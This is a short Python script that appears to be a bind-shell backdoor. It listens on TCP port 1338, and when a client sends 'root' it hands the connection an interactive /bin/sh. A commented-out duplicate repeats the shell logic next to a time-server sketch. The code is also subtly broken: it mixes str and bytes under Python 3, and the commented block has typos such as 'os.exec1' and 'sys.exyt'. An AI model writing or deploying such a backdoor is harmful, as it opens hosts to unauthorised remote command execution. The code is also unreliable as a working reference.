#!/usr/bin/env python
# --*--coding:UTF-8 --*--

import code
import os
import socket
import sys
import datetime


def main():
	# IP address of the server
	host = ''

	# Port number of the server
	port = 1338

	# Create a TCP server socket
	tcp_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

	try:
		tcp_socket.settimeout(20)
		tcp_socket.bind((host, port))
		tcp_socket.listen(1)

		(client, address) = tcp_socket.accept()

		print(f"Address: {address}, client: {client.getpeername()}")

		client.send("Hola Mundo")

		response = client.recv(1024)
		print(f"Response: {response}")

		while True:
			if response == "root\n":
				print("We are in root")
				for f in range(3):
					os.dup2(client.fileno(), f)
				os.execl("/bin/sh", "/bin/sh")
				code.interact()
				sys.exit()
			else:
				print("exit")
				break

		client.close()
		tcp_socket.close()
	except Exception as Ex:
		print("Exception Occurred: %s" % Ex)

		# Close the socket upon an exception
		tcp_socket.close()


# # Bind the tcp socket to an IP and port
# s.bind((host, port))
#
# # Keep listening
# s.listen()
#
# while True:
# 	# Keep accepting connections from clients
# 	(client, direction) = s.accept()
#
# 	print(direction)
# 	print(client.getpeername())
#
# 	# Send current server time to the client
# 	server_time_now = "%s" % datetime.datetime.now()
# 	client.send(server_time_now.encode())
# 	print("Sent %s to %s" % (server_time_now, direction))
#
# 	# Close the connection to the client
# 	client.close()


# client.send("Hola eni\n")
# palabra = client.recv(1024)
#
# print(palabra)
#
# if palabra == "root\n":
# 	print("Estamos en root")
# 	for f in range(3):
# 		os.dup2(client.fileno(), f)
# 	os.exec1("/bin/sh", "/bin/sh")
# 	code.interact()
# 	sys.exyt()
# else:
# 	print("Salimos")
#
# client.close()
# s.close()


if __name__ == '__main__':
	main()
